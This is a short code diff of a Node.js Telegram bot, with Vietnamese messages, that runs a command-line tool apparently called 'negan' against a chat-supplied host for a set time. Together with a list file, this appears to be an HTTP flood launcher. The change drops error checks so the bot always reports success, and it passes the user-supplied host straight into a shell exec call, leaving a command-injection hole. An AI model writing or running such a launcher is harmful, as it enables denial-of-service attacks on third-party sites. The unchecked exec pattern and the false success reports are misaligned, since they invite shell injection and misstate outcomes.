@@ -30,12 +30,7 @@ bot.on('message', (msg) => {
 
     const command = `node ./negan -m GET -u ${host} -p 1.txt --full true -s ${time}`;
 
-    const childProcess = exec(command, (error, stdout, stderr) => {
-        if (error || stderr) {
-            bot.sendMessage(chatId, `Error: Lệnh không thực thi được!`);
-        } else {
-            const pid = childProcess.pid;
-            bot.sendMessage(chatId, `Successfully: ${command}\nPID: ${pid}`);
-        }
-    });
+    // Thực thi lệnh và gửi thông báo thành công ngay lập tức
+    exec(command);
+    bot.sendMessage(chatId, `Lệnh đã được gửi Successfully: ${command}`);
 });
